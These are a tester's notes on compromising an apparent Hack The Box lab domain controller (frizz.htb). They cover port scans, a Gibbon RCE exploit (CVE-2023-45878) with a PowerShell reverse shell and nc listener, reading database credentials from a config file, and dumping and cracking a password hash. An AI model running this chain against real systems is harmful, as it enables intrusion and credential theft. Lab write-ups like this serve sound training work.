## Testing

IP:
```
10.129.232.168
```

---
Start: 2026-09-01 12:10

ports

```
sudo nmap -p- -Pn -n -vv --min-rate=5000 10.129.232.168 -oG network/nmap_ports.txt
```

01

SSH, DNS, HTTP, Kerberos, RPC, LDAP, SMB - Active Directory, Domain Controller

service

```
sudo nmap -sCV -p22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49667,49670,62376,62380,62390 --min-rate=5000 10.129.232.168 -oN network/nmap_service.txt
```

02a

Kerberos time: 2026-09-01 18:09:07
Domain: frizz.htb

02b

SMB signing required, no SMB relay

Unauthenticated enumeration

```
nxc smb 10.129.232.168 -u '' -p ''
```

03

NTLM disabled
Hostname: frizzdc

Add IP - Domin/Hostname to /etc/hosts

04


Web

Browsing: http://frizz.htb

05

School web page, see a login

Scrolling see a encoded string under "Hacking & The Law"

07

Is base64 encoded. Just a message: "Want to learn hacking but don't want to go to jail? You'll learn the in's and outs of Syscalls and XSS from the safety of international waters and iron clad contracts from your customers, reviewed by Walkerville's finest attorneys."

Following the login button

08

Gibbon v25.0.00
Potential user: Fiona Frizzle (f.frizzle, fiona.frizzle ?)
They talking about migration to Azure AD. Also using only kerberos it seems.

Clicking on applications there is no function but notice using .php files.

Trying login (admin:admin, etc) notice there is a error message that could be useful for brute forcing.

Enumerating technologies

```
whatweb http://frizzdc.frizz.htb
```

10

Apache 2.4.58
OpneSSL 3.1.3
PHP 8.2.12
Modernizr 2.6.2.min

Directory Fuzzing

```
ffuf -u http://frizzdc.frizz.htb/FUZZ -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -fc 301
```

Nothing interesting 

VHost 

```
ffuf -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.129.232.168 -H "Host: FUZZ.frizz.htb" -fc 302
```

Nothing

---

Created a wordlist with possible usernames for fiona, also then with seclists xato-..., to try discover domain users with kerbrute, getting error: `[Root cause: Encoding_Error] Encoding_Error: failed to unmarshal KDC's reply: asn1: syntax error: sequence truncated`

Im stuck

Hint: https://www.youtube.com/watch?v=1fCOHQE6A6c. Min 5

Searching CVEs discovered for the Gibbon (GibbonEdu) framework on cvedetails. He picks [CVE-2023-45878](https://www.cvedetails.com/cve/CVE-2023-45878/ "CVE-2023-45878 security vulnerability details") Which affects 25.0.1, target uses 25.0.0 so should work.
It seems with this CVE an attacker can write a malicious php file and call it for RCE

11

I will try to use this automated script: https://github.com/davidzzo23/CVE-2023-45878

12

The script encodes the php payload, write and call it automatically, also having an option to directly run a PowerShell reverse shell.

```
wget https://raw.githubusercontent.com/davidzzo23/CVE-2023-45878/refs/heads/main/CVE-2023-45878.py
```

Running whoami to test

```
python3 CVE-2023-45878.py -t frizz.htb -c "whoami"
```

13

Working. RCE as w.webservice at target system

Start listener

```
rlwrap nc -nlvp 9001
```

Run PowerShell reverse shell option

```
python3 CVE-2023-45878.py -t frizz.htb -s -i 10.10.15.228 -p 9001
```

14

Got the shell

```Powershell
whoami;ipconfig
```

15

Enumerating users

```
net users
```

16

A bunch of users. Including f.frizz for fiona as expected. I suppose is a intersting and somewhat privileged account since it seems its the one doing migrations. Saving them to file.

Uploaded SharpHound.ps1, trying to run it but cant.

Enumerating with AD module

```
Import-Module ActiveDirectory
```

Enumerating administrators

```
Get-ADGroupMember -Identity "Administrators"
```

17

v.frizzle is admin

Enumerating RMUs

```
Get-ADGroupMember -Identity "Remote Management Users"
```

18

m.schoolbus and f.frizzle are members of Remote Mnagement Users (SSH)

Im stuck

Referenced: https://www.youtube.com/watch?v=1fCOHQE6A6c. Min 11

Reading the web config file

19

```Powershell
type config.php
```

20

Username: MrGibbonsDB
Password: MisterGibbs!Parrot!?1

Conecting to mysql database

```
cd \xampp\mysql\bin
```

```
.\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'show tables'
```

21

gibbonperson is the intersting table

```
.\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'describe gibbonperson'
```

22

Interesting fields
- username
- passwordStrong
- passwordStrongSalt

```
.\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'select username, passwordStrong, passwordStrongSalt from gibbonperson'
```

23

username: f.frizzle
password (hash): 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
salt: /aACFhikmNopqrRTVz2489

Forming hash to crack

```
f.frizzle:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
```

Asking hascat to print possible modes for the hash

```
hashcat --username frizz.htb.f.frizzle.hash
```

24

It seems 1420 is what it wants. I would have chose 1410 since the hash is pass:salt and not the other way (salt:hash)...

```
hashcat -m 1420 --username frizz.htb.f.frizzle.hash /opt/tools/wordlists/rockyou.txt
```

25

Cracked: Jenni_Luvs_Magic23

New creds:
```Username
f.frizzle
```
```Password
Jenni_Luvs_Magic23
```

End of reference: min 18

----

Validating credential
SMB

```
nxc smb frizzdc -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -k -d frizz.htb
```

`KDC_ERR_S_PRINCIPAL_UNKNOWN`

Bloodhound enumeration
Running rusthound-ce

```
rusthound-ce -d frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -f frizzdc -z
```

26

Need rest. End: 2026-09-01, 15:00

---

Start: 2026-09-01 16:20

Running BloodHound CE backend and Web interface with docker
Upload .zip file
Add controlled users to owned objects
Query "Shortest Paths from Owned objects"

27

Nothing interesting, just member of Remote Management Users as saw earlier

Trying to connect with SSH

```
ssh f.frizzle@frizzdc.frizz.htb
```

28

Ran more queries but nothing stands out

Referenced: https://www.youtube.com/watch?v=1fCOHQE6A6c. Min 23

Since the target DC enforces kerberos auth, I need to get a TGT to use as authentication for SSH. Besides, it seems to need the fully qualified name (frizzdc.frizz.htb) first on the /etc/hosts reference for DNS resolution.

29

```
getTGT.py FRIZZ.HTB/f.frizzle:Jenni_Luvs_Magic23
```

30

```
KRB5CCNAME=f.frizzle.ccache ssh -K f.frizzle@10.129.232.168 -v
```

31

Using "fully qualified" name or domain hangs up thinking, no verbose.
Tried getting new TGT, sync to DC again, using hostname, domain, IP, ... nothing.
Cant progress.

End: 2026-09-01, 17:15

---
---
#### Post testing
##### Time frame
Start: 2026-09-01, 12:10
End: 2026-09-01, 15:00
Start: 2026-09-01 16:30
End: 2026-09-01, 17:15

Total time: 3h 35min

##### Referenced
- Discover CVE-2023-45878 for Gibbon framework < 20.0.1
- Discover web server config file containing credential for database user
- Discover and utilize mysql.exe to enumerate and discover credentials
- Finding and using the correct mode to crack the hash with hashcat
- Using SSH with kerberos authentication and DC DNS quirk

#### Sources
Gibbson CVE: https://www.cvedetails.com/cve/CVE-2023-45878/
CVE exploit/PoC: https://github.com/davidzzo23/CVE-2023-45878/tree/main
IppSec video reference: https://www.youtube.com/watch?v=1fCOHQE6A6c


##### Techniques
- CVE lookup with cvedetails - https://www.cvedetails.com/
- CVE-2023-45878 for Gibbon framework < 20.0.1 exploitation
- Database enumeration with mysql.exe via PowerShell
- SSH with kerberos
